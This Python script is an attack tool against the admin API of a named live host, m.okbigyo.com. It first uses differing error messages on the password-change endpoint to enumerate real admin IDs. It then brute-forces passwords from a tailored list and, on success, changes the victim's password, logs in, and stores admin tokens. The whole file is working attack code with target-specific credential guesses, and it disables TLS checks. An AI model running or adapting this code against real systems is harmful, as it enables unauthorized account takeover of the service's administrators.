#!/usr/bin/env python3
"""Two-namespace admin oracle.

Discovery: /admin-api/auth/login and /admin-api/auth/password use DIFFERENT
ID pools. login: "등록되지 않은 사번 입니다."; password-change: same phrase for
ghosts, "비밀번호가 일치하지 않습니다." for real ones (dongmin, admin confirmed
REAL in the password namespace).

Phase A: sweep CANDIDATES against the password endpoint (dummy old-password)
        -> real_ids.json (existence oracle, appears lockout-free).
Phase B: for real ids, grind the 95-pwd list AS THE OLD PASSWORD on the
        password endpoint. On success the old pwd is known -> log in via
        /auth/login to mint admin_token.json.
Phase C: bridge — try real ids on the LOGIN endpoint with the same list
        (they may exist in both namespaces).
Sharded like admin_cracker (ADMIN_SHARDS/ADMIN_SHARD).
"""
import json
import os
import ssl
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
PWD_URL = "https://m.okbigyo.com:9443/bigyo/admin-api/auth/password"
LOGIN_URL = "https://m.okbigyo.com:9443/bigyo/admin-api/auth/login"
UA = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE
DELAY = float(os.environ.get("ORACLE_DELAY", "0.5"))
PHASE_A_CAP = int(os.environ.get("ORACLE_ENUM_CAP", "120"))
PHASE_B_CAP = int(os.environ.get("ORACLE_CRACK_CAP", "200"))

CANDIDATES = [
    # spec-leaked + confirmed-real
    "dongmin", "kimdongmin", "kdongmin", "admin", "administrator",
    # roles / org
    "manager", "master", "root", "superadmin", "god", "operator", "oper",
    "staff", "test", "demo", "guest", "cs", "support", "care", "center",
    "biz", "sales", "finance", "loan", "ceo", "cfo", "coo", "cto", "cmo",
    "dev", "developer", "engineer", "programmer", "coder", "ops", "pm",
    "product", "design", "designer", "marketing", "ad", "pr", "hr",
    "accountant", "bookkeeper", "tax", "legal", "contract", "audit",
    # brand
    "okbigyo", "bigyo", "okbank", "ok", "coocon", "okcs", "okadmin",
    "bigyoadmin", "cooconadmin", "okbigyo1", "bigyo1", "okbigyo123",
    "okmobile", "okteam", "okdev", "okpm", "okcare", "oksales", "okbiz",
    "okoffice", "okhr", "okfinance", "okloan", "okcredit", "bigyoteam",
    "bigyodev", "bigyocs",
    # korean dev names (romanized)
    "seoyeon", "hyemin", "minji", "sujin", "jiwoo", "taeyang", "haneul",
    "sungmin", "jihyun", "minseo", "yejin", "eunjoo", "jiyoon", "haerin",
    "dasom", "siwon", "junho", "yujin", "gihun", "woohyuk", "jaehyuk",
    "seungjun", "hyunsik", "kyungmin", "namchu", "byeongsu", "changho",
    "seungho", "minho", "junyoung", "sungho", "taejun", "hyuk", "jung",
    "ho", "su", "man", "young", "mi", "hee", "ju", "ji", "na", "so",
    "ha", "bo", "bin", "jin", "seong", "hwa", "gil", "rok", "bang",
    # english common
    "kevin", "david", "chris", "mike", "james", "peter", "alex", "ben",
    "tom", "lucy", "emma", "mia", "grace", "angel", "star", "moon",
    "coffee", "happy", "love", "hello", "welcome", "money", "bank",
    # numeric 사번 probes
    "1", "2", "3", "10", "100", "1000", "1001", "1002", "2001", "3001",
    "9999", "admin1", "admin2", "admin01", "super", "secret", "boss",
    "owner", "founder", "partner", "president", "director", "chief",
    "leader", "user", "member", "maintainer", "tester", "qa",
]

PASSWORDS = [
    "admin1234", "admin123!", "admin1234!", "Admin1234!", "admin!1234",
    "okbigyo1234", "Okbigyo1234!", "okbigyo!", "okbigyo123",
    "bigyo1234", "Bigyo1234!", "bigyo!", "bigyo123",
    "coocon1234", "Coocon1234!", "coocon!", "coocon123",
    "ok1234!", "ok1234", "okbank1234", "okbank!",
    "1qaw2ews", "1q2w3e4r", "qwerty1234", "qwer1234", "zaq1xsw2",
    "password", "password1", "pass1234", "abc12345", "abcd1234",
    "iloveyou1!", "hello1234", "welcome1!", "test1234", "spring1234",
    "oracle1234", "weblogic1234", "11111111", "00000000", "12345678",
    "123456789", "1234567890", "123456789!", "1234567890!",
    "a12345678", "a123456789", "q12345678", "pw123456", "temp1234",
    "20240101", "20250101", "20260101", "okbigyo2026", "bigyo2026",
    "Okbigyo!1234", "okbigyo!1234", "BIGYO1234!", "Ok_bigyo1234",
    "okbigyo!@#", "okbigyo1234!", "Bigyo!1234", "coocon!1234", "Coocon!1234",
    "okbigyo2024", "okbigyo2025", "bigyo2024!", "bigyo2025!", "bigyo2026!",
    "okbank1234!", "Okbank1234!", "okbank!1234",
    "1qaz2wsx", "1qazxsw2", "zsx1csw2", "2wsx1qaz", "1qa2ws3ed",
    "loan1234!", "Loan1234!", "credit1234!", "Credit1234!", "money1234!",
    "finance1234!", "admin@1234", "admin!@#", "p@ssw0rd", "Password123!",
    "Welcome123!", "Springboot1!", "Oracle1234!", "java1234!",
    "1234!qaws", "!qaws1234", "qaws1234!", "asdf1234!",
]


def post(url, payload):
    body = json.dumps(payload).encode()
    req = urllib.request.Request(url, data=body,
                                 headers={"User-Agent": UA, "Content-Type": "application/json"})
    try:
        with urllib.request.urlopen(req, timeout=12, context=CTX) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")
    except Exception as e:
        return None, repr(e)[:120]


def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)


def jload(name):
    p = os.path.join(HERE, name)
    if os.path.exists(p):
        try:
            return json.load(open(p))
        except Exception:
            pass
    return {}


def jsave(name, obj):
    json.dump(obj, open(os.path.join(HERE, name), "w"), ensure_ascii=False, indent=1)


def main():
    SHARD_TOTAL = int(os.environ.get("ADMIN_SHARDS", "1"))
    SHARD_IDX = int(os.environ.get("ADMIN_SHARD", "0"))
    SF = f"oracle_state_{SHARD_IDX}.json" if SHARD_TOTAL > 1 else "oracle_state.json"
    st = jload(SF)
    real = jload("real_ids.json")
    my_cands = [c for i, c in enumerate(CANDIDATES) if i % SHARD_TOTAL == SHARD_IDX]
    if SHARD_TOTAL > 1:
        log(f"ORACLE SHARD {SHARD_IDX}/{SHARD_TOTAL}: {len(my_cands)} candidates")

    # ---- Phase A: existence sweep on password endpoint
    spent_a = 0
    for cid in my_cands:
        if cid in st.get("enum_done", {}):
            continue
        if spent_a >= PHASE_A_CAP:
            log(f"PHASE_A_CAP {PHASE_A_CAP} reached")
            break
        _, body = post(PWD_URL, {"adminId": cid, "name": "테스트", "birthday": "19900101",
                                 "password": "Dummy!1234", "newPassword": "Dummy!5678"})
        spent_a += 1
        is_real = "일치하지" in body
        st.setdefault("enum_done", {})[cid] = "real" if is_real else "ghost"
        if is_real:
            real[cid] = {"ts": int(time.time()), "via": "oracle"}
            log(f"★★ REAL ID CONFIRMED: {cid} :: {body[:120]}")
        else:
            log(f"ghost: {cid}")
        jsave(SF, st)
        jsave("real_ids.json", real)
        time.sleep(DELAY)

    # ---- Phase B: old-password grind on password endpoint for real ids
    spent_b = 0
    for rid, meta in list(real.items()):
        rec = st.setdefault("crack", {}).setdefault(rid, {"pwd_idx": 0})
        idx = rec["pwd_idx"]
        while idx < len(PASSWORDS) and spent_b < PHASE_B_CAP:
            pwd = PASSWORDS[idx]
            idx += 1
            spent_b += 1
            rec["pwd_idx"] = idx
            _, body = post(PWD_URL, {"adminId": rid, "name": "테스트", "birthday": "19900101",
                                     "password": pwd, "newPassword": "Flip!2026x"})
            jsave(SF, st)
            if '"result":"SUCCESS"' in body or '"result": "SUCCESS"' in body or '"success":true' in body:
                log(f"★★★ OLD PASSWORD FOUND: {rid} = {pwd} :: {body[:200]}")
                # flip already submitted; try login with BOTH old and new
                for lp in (pwd, "Flip!2026x"):
                    lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": lp})
                    log(f"LOGIN {rid}/{lp}: http={lst} {lbody[:200]}")
                    if '"token"' in lbody:
                        cred = {"adminId": rid, "password": lp, "raw": lbody[:2000],
                                "ts": int(time.time())}
                        tok = jload("admin_token.json")
                        if isinstance(tok, list):
                            tok.append(cred)
                        else:
                            tok = [tok] if tok else []
                            tok.append(cred)
                        jsave("admin_token.json", tok)
                        log("*** admin_token.json WRITTEN")
                        break
                break
            log(f"B {rid} #{idx} {pwd}: {body[:100]}")
            time.sleep(DELAY)
        if spent_b >= PHASE_B_CAP:
            log(f"PHASE_B_CAP {PHASE_B_CAP} reached")
            break

    # ---- Phase C: bridge real ids to login endpoint (top-12)
    spent_c = 0
    for rid in real:
        rec = st.setdefault("bridge", {}).setdefault(rid, {"pwd_idx": 0})
        idx = rec["pwd_idx"]
        while idx < 12 and spent_c < 40:
            pwd = PASSWORDS[idx]
            idx += 1
            spent_c += 1
            rec["pwd_idx"] = idx
            lst, lbody = post(LOGIN_URL, {"adminId": rid, "password": pwd})
            jsave(SF, st)
            if '"token"' in lbody:
                log(f"★★★ BRIDGE LOGIN CRACKED: {rid} = {pwd}")
                cred = {"adminId": rid, "password": pwd, "raw": lbody[:2000],
                        "ts": int(time.time())}
                tok = jload("admin_token.json")
                if not isinstance(tok, list):
                    tok = [tok] if tok else []
                tok.append(cred)
                jsave("admin_token.json", tok)
                break
            log(f"C {rid} #{idx} {pwd}: http={lst} {lbody[:100]}")
            time.sleep(DELAY)
        if spent_c >= 40:
            break
    log("ORACLE CYCLE DONE")


if __name__ == "__main__":
    main()
